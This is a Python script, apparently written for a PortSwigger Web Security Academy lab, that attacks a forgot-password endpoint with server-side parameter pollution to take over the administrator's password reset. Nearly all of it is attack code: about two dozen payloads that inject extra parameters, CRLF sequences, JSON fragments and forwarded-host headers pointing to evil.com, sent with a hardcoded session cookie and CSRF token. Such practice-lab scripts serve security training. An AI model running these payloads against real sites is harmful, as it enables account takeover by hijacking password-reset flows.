#!/usr/bin/env python3
import requests
import urllib.parse
import json

url = "https://0a0a004e034f7a8182e93d0c004d00b7.web-security-academy.net/forgot-password"
session = "34ERCypmj8Hg3MDNkK4ULVsD1BVFXsrL"

headers = {
    "Cookie": f"session={session}",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Accept": "*/*"
}

payloads = [
    # URL encoding variations
    ("csrf=YwhAhSyhUwrK4ym9guuBkZtag1sonlkl&username=administrator%26foo=bar", "URL encoded ampersand"),
    ("csrf=YwhAhSyhUwrK4ym9guuBkZtag1sonlkl&username=administrator%2523test", "URL encoded hash"),
    ("csrf=YwhAhSyhUwrK4ym9guuBkZtag1sonlkl&username=administrator%3ffoo=bar", "URL encoded question mark"),

    # Fragment injection
    ("csrf=YwhAhSyhUwrK4ym9guuBkZtag1sonlkl&username=administrator#foo=bar", "Fragment with param"),
    ("csrf=YwhAhSyhUwrK4ym9guuBkZtag1sonlkl&username=administrator#&foo=bar", "Fragment with ampersand"),

    # Query string injection
    ("csrf=YwhAhSyhUwrK4ym9guuBkZtag1sonlkl&username=administrator?foo=bar", "Query string injection"),
    ("csrf=YwhAhSyhUwrK4ym9guuBkZtag1sonlkl&username=administrator&username=carlos", "Duplicate parameter"),

    # Server-side template pollution
    ("csrf=YwhAhSyhUwrK4ym9guuBkZtag1sonlkl&username=administrator§ion=reset", "Additional parameter"),
    ("csrf=YwhAhSyhUwrK4ym9guuBkZtag1sonlkl&username=administrator&reset_domain=evil.com", "Domain parameter"),
    ("csrf=YwhAhSyhUwrK4ym9guuBkZtag1sonlkl&username=administrator&host=evil.com", "Host parameter"),
    ("csrf=YwhAhSyhUwrK4ym9guuBkZtag1sonlkl&username=administrator&redirect=http://evil.com", "Redirect parameter"),
    ("csrf=YwhAhSyhUwrK4ym9guuBkZtag1sonlkl&username=administrator&email=test@evil.com", "Email override"),

    # Path/URL manipulation
    ("csrf=YwhAhSyhUwrK4ym9guuBkZtag1sonlkl&username=administrator&path=/evil", "Path parameter"),
    ("csrf=YwhAhSyhUwrK4ym9guuBkZtag1sonlkl&username=administrator&url=http://evil.com", "URL parameter"),
    ("csrf=YwhAhSyhUwrK4ym9guuBkZtag1sonlkl&username=administrator&callback=http://evil.com", "Callback parameter"),

    # Special characters
    ("csrf=YwhAhSyhUwrK4ym9guuBkZtag1sonlkl&username=administrator\nHost: evil.com", "Newline injection"),
    ("csrf=YwhAhSyhUwrK4ym9guuBkZtag1sonlkl&username=administrator\r\nHost: evil.com", "CRLF injection"),
    ("csrf=YwhAhSyhUwrK4ym9guuBkZtag1sonlkl&username=administrator%0aHost: evil.com", "Encoded newline"),
    ("csrf=YwhAhSyhUwrK4ym9guuBkZtag1sonlkl&username=administrator%0d%0aHost: evil.com", "Encoded CRLF"),

    # Backend-specific pollution
    ("csrf=YwhAhSyhUwrK4ym9guuBkZtag1sonlkl&username=administrator;foo=bar", "Semicolon separator"),
    ("csrf=YwhAhSyhUwrK4ym9guuBkZtag1sonlkl&username=administrator,foo=bar", "Comma separator"),
    ("csrf=YwhAhSyhUwrK4ym9guuBkZtag1sonlkl&username=administrator|foo=bar", "Pipe separator"),

    # JSON injection attempts
    ('csrf=YwhAhSyhUwrK4ym9guuBkZtag1sonlkl&username=administrator","domain":"evil.com', "JSON injection"),
    ('csrf=YwhAhSyhUwrK4ym9guuBkZtag1sonlkl&username=administrator\\"}&domain=evil.com&x={\\"', "JSON escape"),
]

print("Testing Server-Side Parameter Pollution...")
print("=" * 60)

for payload, description in payloads:
    try:
        response = requests.post(url, data=payload, headers=headers, verify=False, timeout=10)
        result = response.text

        # Check if response differs from normal
        if "normal-user.net" not in result:
            print(f"✓ INTERESTING - {description}:")
            print(f"  Payload: {payload[:80]}...")
            print(f"  Response: {result[:200]}")
            print()
        else:
            try:
                parsed = json.loads(result)
                if parsed.get("result") and "normal-user.net" not in parsed["result"]:
                    print(f"✓ MODIFIED EMAIL - {description}:")
                    print(f"  Payload: {payload[:80]}...")
                    print(f"  Email: {parsed['result']}")
                    print()
            except:
                pass

    except Exception as e:
        print(f"✗ Error with {description}: {str(e)[:100]}")

print("\nTesting with modified headers...")
print("=" * 60)

# Test with header manipulation
special_headers = [
    ({"X-Forwarded-Host": "evil.com"}, "X-Forwarded-Host"),
    ({"X-Forwarded-Server": "evil.com"}, "X-Forwarded-Server"),
    ({"X-HTTP-Host-Override": "evil.com"}, "X-HTTP-Host-Override"),
    ({"X-Original-URL": "http://evil.com"}, "X-Original-URL"),
    ({"X-Rewrite-URL": "http://evil.com"}, "X-Rewrite-URL"),
]

for extra_headers, header_name in special_headers:
    try:
        test_headers = {**headers, **extra_headers}
        response = requests.post(
            url,
            data="csrf=YwhAhSyhUwrK4ym9guuBkZtag1sonlkl&username=administrator",
            headers=test_headers,
            verify=False,
            timeout=10
        )
        result = response.text

        if "normal-user.net" not in result:
            print(f"✓ INTERESTING - {header_name} header:")
            print(f"  Response: {result[:200]}")
            print()

    except Exception as e:
        print(f"✗ Error with {header_name}: {str(e)[:100]}")